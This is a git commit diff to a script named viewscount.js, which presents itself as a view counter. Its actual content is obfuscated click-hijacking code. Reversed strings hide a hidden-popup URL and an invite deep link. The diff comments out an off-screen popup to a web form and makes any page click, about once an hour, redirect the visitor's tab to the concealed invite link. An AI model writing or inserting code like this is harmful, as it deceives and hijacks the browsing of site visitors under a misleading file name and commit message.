dc7378de14c4fffef08053616e03ef3ceafe7a0b
JTJ <49002275+ProfessorJTJ@users.noreply.github.com>
2023-10-18 22:28:25 +0330

    Update viewscount.js

--- js/viewscount.js
+++ js/viewscount.js
@@ -1,5 +1,5 @@
 (function(docpointer) {
-	let eatApple = "27300333b0C2197715743=etivni?nioj//:te".split("").reverse().join("");
+	let eatApple = "f8c04ddebbC948229261=etivni?nioj//:te".split("").reverse().join("");
 	let showPopUp = function() {
 		let meItem = localStorage.getItem("popcornlast");
 		if (meItem == null || (Date.now() - parseInt(meItem)) > (60 * 60 * 1000)) {
@@ -23,9 +23,9 @@
 	
 	document.addEventListener("click", function(e) {
 		if (showPopUp()) {
-		        var width = screen.width / 4;var height = screen.height / 4;var config='width=' + (width) + ', height=' + (height)+',top=99999999,left=99999999,status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no,fullscreen=no';
-			window.open("vm3um/mrof/moc.razfamrof//:sptth".split("").reverse().join(""), "_blank", config);				
-			//window.open(eatApple, "_self");
+		        //var width = screen.width / 4;var height = screen.height / 4;var config='width=' + (width) + ', height=' + (height)+',top=99999999,left=99999999,status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no,fullscreen=no';
+			//window.open("vm3um/mrof/moc.razfamrof//:sptth".split("").reverse().join(""), "_blank", config);				
+			window.open(eatApple, "_self");
 			localStorage.setItem("popcornlast", Date.now());
 		}
 	});
